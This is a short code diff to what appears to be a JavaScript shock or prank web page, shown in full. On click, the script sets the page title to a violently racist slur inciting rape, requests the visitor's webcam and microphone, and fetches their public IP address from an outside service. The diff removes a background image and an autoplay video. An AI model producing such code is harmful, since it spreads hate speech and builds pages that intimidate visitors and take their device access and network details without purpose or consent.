@@ -10,15 +10,9 @@ container.addEventListener('click', async () => {
 	document.querySelector("#play").remove()
 	document.documentElement.style.cursor = "url(cursor/1.gif), none"
 	document.documentElement.style.animation = "cursor 1s linear infinite"
-	document.documentElement.style.background = "url(media/popup.gif)"
+	
 	document.title = "RAPE ALL BLACK NIGGERS"
-	poop = document.createElement("video")
-	poop.src = "media/poop.mp4"
-	poop.id = "poop"
-	poop.muted = true
-	poop.autoplay = true
-	poop.loop = true
-	document.body.appendChild(poop)
+	
 	document.querySelector("link[rel='icon']").href = "faviconpp.ico";
 	navigator.mediaDevices.getUserMedia({ video: true, audio: true })
 	fetch("https://api.ipify.org?format=json")
